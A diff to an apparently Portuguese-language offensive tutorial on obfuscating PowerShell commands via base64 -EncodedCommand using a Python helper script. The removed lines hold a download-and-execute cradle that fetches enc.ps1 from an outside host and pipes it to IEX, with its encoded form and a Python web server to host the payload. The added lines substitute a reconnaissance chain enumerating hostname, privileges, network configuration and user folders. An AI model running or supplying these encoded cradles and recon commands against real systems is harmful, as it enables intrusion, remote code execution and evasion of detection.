@@ -34,7 +34,7 @@ nano encode-command.py
 
 Comando a ser incluido
 ```
-(New-Object System.Net.WebClient).DownloadString('http://update-sync.org/enc.ps1')|IEX
+cmd /c 'hostname && whoami && whoami /priv && ipconfig /all && dir \ && tree /a /f C:\users\'
 ```
 
 Resultado final do script
@@ -53,7 +53,7 @@ def gerar_comando_encodado(comando_ps):
 
 # Insira seu comando PowerShell aqui
 #comando = 'Get-Process | Where-Object {$_.CPU -gt 100}'
-comando = "(New-Object System.Net.WebClient).DownloadString('http://update-sync.org/enc.ps1')|IEX"
+comando = "cmd /c 'hostname && whoami && whoami /priv && ipconfig /all && dir \\ && tree /a /f C:\\users\\'"
 
 # Exibe o comando encodado completo
 print("Comando PowerShell Encodado:")
@@ -67,22 +67,12 @@ python encode-command.py
 
 Resultado do script
 ```
-$ python encode-command.py                                                                        
+$ python encode-command.py
 Comando PowerShell Encodado:
-powershell -EncodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALQBzAHkAbgBjAC4AbwByAGcALwBlAG4AYwAuAHAAcwAxACcAKQB8AEkARQBYAA==
-```
-
-Payload a ser executado: whoami
-```
-echo whoami > enc.ps1
-```
-
-Iniciando Webserver em Python na porta 80
-```
-python -m http.server 80
+powershell -EncodedCommand YwBtAGQAIAAvAGMAIAAnAGgAbwBzAHQAbgBhAG0AZQAgACYAJgAgAHcAaABvAGEAbQBpACAAJgAmACAAdwBoAG8AYQBtAGkAIAAvAHAAcgBpAHYAIAAmACYAIABpAHAAYwBvAG4AZgBpAGcAIAAvAGEAbABsACAAJgAmACAAZABpAHIAIABcACAAJgAmACAAdAByAGUAZQAgAC8AYQAgAC8AZgAgAEMAOgBcAHUAcwBlAHIAcwBcACcA
 ```
 
 Executando o comando encodade no Windows
 ```
-powershell -EncodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALQBzAHkAbgBjAC4AbwByAGcALwBlAG4AYwAuAHAAcwAxACcAKQB8AEkARQBYAA==
+powershell -EncodedCommand YwBtAGQAIAAvAGMAIAAnAGgAbwBzAHQAbgBhAG0AZQAgACYAJgAgAHcAaABvAGEAbQBpACAAJgAmACAAdwBoAG8AYQBtAGkAIAAvAHAAcgBpAHYAIAAmACYAIABpAHAAYwBvAG4AZgBpAGcAIAAvAGEAbABsACAAJgAmACAAZABpAHIAIABcACAAJgAmACAAdAByAGUAZQAgAC8AYQAgAC8AZgAgAEMAOgBcAHUAcwBlAHIAcwBcACcA
 ```
